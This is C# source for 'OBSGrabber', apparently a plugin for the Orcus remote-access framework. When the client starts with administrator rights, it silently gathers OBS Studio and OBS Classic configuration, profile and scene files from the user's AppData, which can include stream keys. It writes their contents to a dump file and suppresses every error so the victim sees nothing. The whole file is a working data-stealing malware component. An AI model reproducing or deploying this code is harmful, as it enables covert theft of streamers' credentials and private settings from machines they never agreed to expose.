using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Orcus.Plugins;

namespace OBSGrabber
{
    public class OBSGrabber : ClientController
    {
        public override bool InfluenceStartup(IClientStartup clientStartup)
        {
            if (!clientStartup.IsAdministrator)
            {
                return false;
            }

            string clientPath = clientStartup.ClientPath;
            string outputFile = Path.Combine(Path.GetDirectoryName(clientPath), "obsgrab.txt");

            try
            {
                var obsData = GrabOBSData();
                if (obsData.Count > 0)
                {
                    SaveToFile(obsData, outputFile);
                    return true;
                }
            }
            catch (Exception)
            {
                // Silent fail
            }

            return false;
        }

        private List<object[]> GrabOBSData()
        {
            List<object[]> list = new List<object[]>();
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // Check OBS Studio in AppData
            if (Directory.Exists(appDataPath + "\\obs-studio\\"))
            {
                GrabOBSStudioData(appDataPath + "\\obs-studio\\", list);
            }

            // Check OBS Studio in LocalAppData
            if (Directory.Exists(localAppDataPath + "\\obs-studio\\"))
            {
                GrabOBSStudioData(localAppDataPath + "\\obs-studio\\", list);
            }

            // Check OBS Classic
            if (Directory.Exists(appDataPath + "\\OBS\\"))
            {
                GrabOBSClassicData(appDataPath + "\\OBS\\", list);
            }

            return list;
        }

        private void GrabOBSStudioData(string obsPath, List<object[]> list)
        {
            try
            {
                // Global configuration
                if (File.Exists(obsPath + "global.ini"))
                {
                    list.Add(new object[]
                    {
                        "OBSStudio/global.ini",
                        File.ReadAllBytes(obsPath + "global.ini")
                    });
                }

                // Profiles
                string profilesPath = obsPath + "basic\\profiles\\";
                if (Directory.Exists(profilesPath))
                {
                    string[] profileFiles = Directory.GetFiles(profilesPath, "*.*", SearchOption.AllDirectories);
                    foreach (string filePath in profileFiles)
                    {
                        string relativePath = "OBSStudio/Profiles/" +
                                            Path.GetFileName(Path.GetDirectoryName(filePath)) + "/" +
                                            Path.GetFileName(filePath);
                        list.Add(new object[]
                        {
                            relativePath,
                            File.ReadAllBytes(filePath)
                        });
                    }
                }

                // Scene collections
                string sceneCollectionsPath = obsPath + "basic\\scenes\\";
                if (Directory.Exists(sceneCollectionsPath))
                {
                    string[] sceneFiles = Directory.GetFiles(sceneCollectionsPath, "*.json", SearchOption.AllDirectories);
                    foreach (string filePath in sceneFiles)
                    {
                        string relativePath = "OBSStudio/Scenes/" + Path.GetFileName(filePath);
                        list.Add(new object[]
                        {
                            relativePath,
                            File.ReadAllBytes(filePath)
                        });
                    }
                }

                // Config files
                string[] configFiles = Directory.GetFiles(obsPath, "*.ini", SearchOption.TopDirectoryOnly);
                foreach (string configFile in configFiles)
                {
                    string relativePath = "OBSStudio/Config/" + Path.GetFileName(configFile);
                    list.Add(new object[]
                    {
                        relativePath,
                        File.ReadAllBytes(configFile)
                    });
                }
            }
            catch
            {
                // Ignore errors for individual files
            }
        }

        private void GrabOBSClassicData(string obsPath, List<object[]> list)
        {
            try
            {
                // Global configuration
                if (File.Exists(obsPath + "global.ini"))
                {
                    list.Add(new object[]
                    {
                        "OBSClassic/global.ini",
                        File.ReadAllBytes(obsPath + "global.ini")
                    });
                }

                // Profiles
                string profilesPath = obsPath + "profiles\\";
                if (Directory.Exists(profilesPath))
                {
                    string[] profileDirs = Directory.GetDirectories(profilesPath);
                    foreach (string profileDir in profileDirs)
                    {
                        string[] profileFiles = Directory.GetFiles(profileDir, "*.*", SearchOption.AllDirectories);
                        foreach (string filePath in profileFiles)
                        {
                            string relativePath = "OBSClassic/Profiles/" +
                                                Path.GetFileName(profileDir) + "/" +
                                                Path.GetFileName(filePath);
                            list.Add(new object[]
                            {
                                relativePath,
                                File.ReadAllBytes(filePath)
                            });
                        }
                    }
                }

                // Scene collections
                string scenesPath = obsPath + "scenes\\";
                if (Directory.Exists(scenesPath))
                {
                    string[] sceneFiles = Directory.GetFiles(scenesPath, "*.xconfig", SearchOption.AllDirectories);
                    foreach (string filePath in sceneFiles)
                    {
                        string relativePath = "OBSClassic/Scenes/" + Path.GetFileName(filePath);
                        list.Add(new object[]
                        {
                            relativePath,
                            File.ReadAllBytes(filePath)
                        });
                    }
                }
            }
            catch
            {
                // Ignore errors for individual files
            }
        }

        private void SaveToFile(List<object[]> obsData, string outputPath)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("OBS Grabber Results");
                sb.AppendLine("===================");
                sb.AppendLine($"Generated: {DateTime.Now}");
                sb.AppendLine($"Total files found: {obsData.Count}");
                sb.AppendLine();

                foreach (object[] data in obsData)
                {
                    string filePath = (string)data[0];
                    byte[] fileContent = (byte[])data[1];

                    sb.AppendLine($"File: {filePath}");
                    sb.AppendLine($"Size: {fileContent.Length} bytes");

                    // Try to read as text for certain file types
                    if (filePath.EndsWith(".ini") || filePath.EndsWith(".json") || filePath.EndsWith(".txt"))
                    {
                        try
                        {
                            string content = Encoding.UTF8.GetString(fileContent);
                            sb.AppendLine("Content:");
                            sb.AppendLine(content);
                        }
                        catch
                        {
                            sb.AppendLine("Content: [Binary data]");
                        }
                    }
                    else
                    {
                        sb.AppendLine("Content: [Binary data]");
                    }

                    sb.AppendLine(new string('-', 50));
                    sb.AppendLine();
                }

                File.WriteAllText(outputPath, sb.ToString());
            }
            catch
            {
                // Silent fail
            }
        }

        public override void Start()
        {
            // Optional: Run on startup as well
            string clientPath = GetType().Assembly.Location;
            string outputFile = Path.Combine(Path.GetDirectoryName(clientPath), "obsgrab.txt");

            try
            {
                var obsData = GrabOBSData();
                if (obsData.Count > 0)
                {
                    SaveToFile(obsData, outputFile);
                }
            }
            catch
            {
                // Silent fail
            }
        }
    }
}